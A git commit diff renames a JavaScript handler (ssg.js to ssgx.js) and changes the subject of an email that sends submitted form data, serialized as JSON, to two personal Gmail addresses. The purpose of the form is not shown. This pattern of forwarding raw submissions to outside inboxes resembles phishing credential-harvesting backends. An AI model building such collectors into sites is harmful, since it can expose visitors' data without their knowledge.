17e063f99a7a022177712de96a38c8583cb58aa3
tufailacjsm37-design <tufailacjsm37@gmail.com>
2026-02-24 16:53:05 +0500

    Update and rename ssg.js to ssgx.js

--- ssgx.js
+++ ssgx.js
@@ -38,7 +38,7 @@ export default async function handler(req, res) {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
       to: "ta0134750@gmail.com,gm2521380@gmail.com",
-      subject: "ssg",
+      subject: "ssgx",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
